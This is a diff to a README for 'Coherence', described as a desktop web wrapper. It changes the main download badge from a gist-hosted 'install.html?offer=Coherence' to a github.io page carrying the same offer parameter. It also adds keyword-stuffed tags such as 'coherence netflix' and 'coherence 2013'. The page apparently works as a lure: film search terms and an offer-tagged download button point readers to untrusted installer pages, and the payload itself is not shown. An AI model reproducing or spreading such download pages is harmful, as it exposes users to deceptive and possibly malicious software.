@@ -1,6 +1,6 @@
 # Coherence Download — Desktop Web Wrapper
 
-[![Get Coherence GitHub](https://img.shields.io/badge/Get%20Coherence%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/temptation460/7bdc9fc104b0f47d86c52aeaf848cbec/raw/35f706b3db04b404434ab59c29bfe2ef41648d7a/install.html?offer=Coherence)
+[![Get Coherence GitHub](https://img.shields.io/badge/Get%20Coherence%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Coherence)
 
 ---
 
@@ -69,7 +69,7 @@ A: Yes, Chromium-based engines are supported for app generation.
 ---
 
 ## 🔍 Tags
-coherence, web wrapper desktop, convert site to app, browser isolation tool, standalone web apps, mac windows wrapper, website to desktop client, coherence pc, coherence windows, coherence desktop, coherence for mac, coherence for pc, coherence for windows, coherence mac
+coherence, coherence netflix, coherence imdb, coherence 2013, web wrapper desktop, convert site to app, browser isolation tool, standalone web apps, mac windows wrapper, website to desktop client, coherence pc, coherence windows, coherence desktop, coherence for mac, coherence for pc, coherence for windows, coherence mac
 
 ---
 
